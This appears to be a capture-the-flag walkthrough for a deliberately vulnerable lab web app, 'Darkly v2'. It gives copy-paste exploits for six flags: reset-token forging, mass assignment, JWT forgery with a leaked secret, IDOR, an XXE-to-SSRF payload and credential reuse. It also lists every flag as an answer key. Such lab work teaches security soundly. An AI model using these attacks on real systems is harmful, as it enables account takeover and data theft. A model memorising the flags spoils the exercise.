# Darkly v2 — Quick Guide

Fast path to all **6 mandatory flags**. Copy-paste, top to bottom. Assumes the VM is
running and the app answers at `http://localhost:4942` (see `SETUP.md`).

```bash
B=http://localhost:4942
PB=http://localhost:8090   # internal PocketBase (forward it too: hostfwd ...8090-:8090)
```

---

## Flag 1 — predictable & disclosed reset token
Reset token = `md5(email)`, and the app hands it back in the redirect. Reset a student
and log in.
```bash
E=benjamin@student.42.tech
TOK=$(printf '%s' "$E" | md5 -q)                 # md5sum on Linux
curl -s "$B/reset-password/confirm" --data "email=$E&token=$TOK&new_password=Pwn3d!123"
curl -s -c ben.jar "$B/login" --data "identity=$E&password=Pwn3d!123" >/dev/null
J=$(grep session ben.jar | awk '{print $NF}')    # student session JWT
```
The flag is `recovery_code` on the account → `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}`
(read it in Flag 4).

## Flag 2 — mass assignment (student → cadet)
```bash
curl -s -b "session=$J" -X PATCH "$B/api/profile" -H 'Content-Type: application/json' -d '{"role":"cadet"}' >/dev/null
curl -s -c ben.jar "$B/login" --data "identity=$E&password=Pwn3d!123" >/dev/null   # refresh JWT -> cadet
J=$(grep session ben.jar | awk '{print $NF}')
curl -s -b "session=$J" "$B/staff/dashboard" | grep -oE 'FLAG\{[^}]*\}'
# FLAG{just_p4tch_y0ur_0wn_r0l3_lol}
```

## Flag 3 — weak JWT secret (forge the god account)
Secret `42network` is leaked in the forum. `/admin` trusts the user behind `sub`; forge
sophie's token (id `enplwhu8jfo56oi`).
```bash
python3 - > sophie.jwt <<'PY'
import hmac,hashlib,base64,json,time
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
h=b(b'{"alg":"HS256","typ":"JWT"}')
p=b(json.dumps({"sub":"enplwhu8jfo56oi","login":"sophie","role":"god","exp":int(time.time())+9999},separators=(',',':')).encode())
print((h+b'.'+p+b'.'+b(hmac.new(b'42network',h+b'.'+p,hashlib.sha256).digest())).decode())
PY
curl -s -b "session=$(cat sophie.jwt)" "$B/admin" | grep -oE 'FLAG\{[^}]*\}' | head -1
# FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}
```

## Flag 4 — IDOR (read any user record)
```bash
curl -s -b "session=$J" "$B/api/users/k1asdfeditojrb4" | python3 -m json.tool | grep -E 'private_note|recovery_code'
# wil.private_note  = FLAG{1d0r_ur_pr0f1l3_1s_m1n3}
# any.recovery_code = FLAG{r3s3t_t0k3n_w4s_just_md5_lol}  (this is Flag 1)
```

## Flag 5 — XXE → SSRF (read localhost-only config)
```bash
cat > xxe.xml <<'XML'
<?xml version="1.0"?>
<!DOCTYPE a [ <!ENTITY x SYSTEM "http://localhost:4942/internal/config"> ]>
<agenda><event><title>&x;</title><date>2042-01-01</date></event></agenda>
XML
curl -s -b "session=$J" -F 'file=@xxe.xml;type=text/xml' "$B/agenda/import" \
  | python3 -c "import sys,html,re;print(html.unescape(re.findall(r'<td[^>]*>(.*?)</td>',sys.stdin.read(),re.S)[0]))"
# {"jwt_secret":"42network","pb_admin_email":"admin@42network.local",
#  "pb_admin_password":"Darkly42Admin!",...,"darkly_flag":"FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}"}
```

## Flag 6 — PocketBase superuser (creds from Flag 5)
Needs `:8090` reachable (forward it).
```bash
T=$(curl -s "$PB/api/admins/auth-with-password" -H 'Content-Type: application/json' \
     -d '{"identity":"admin@42network.local","password":"Darkly42Admin!"}' \
     | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
curl -s "$PB/api/collections/internal_audit/records" -H "Authorization: $T" | grep -oE 'FLAG\{[^}]*\}'
# FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}
```

---

### All 6 flags
| # | Flag | Vulnerability |
|---|------|---------------|
| 1 | `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}` | Predictable/disclosed reset token |
| 2 | `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}` | Mass assignment |
| 3 | `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}` | Weak JWT secret |
| 4 | `FLAG{1d0r_ur_pr0f1l3_1s_m1n3}` | IDOR |
| 5 | `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}` | XXE → SSRF |
| 6 | `FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}` | PocketBase superuser (cred reuse) |

Each breach folder (`01-…`–`11-…`) has a runnable `exploit.sh`. Full narrative with
real command outputs: `docs/REPRODUCE.md`. Architecture & methodology: `docs/ARCHITECTURE.md`.
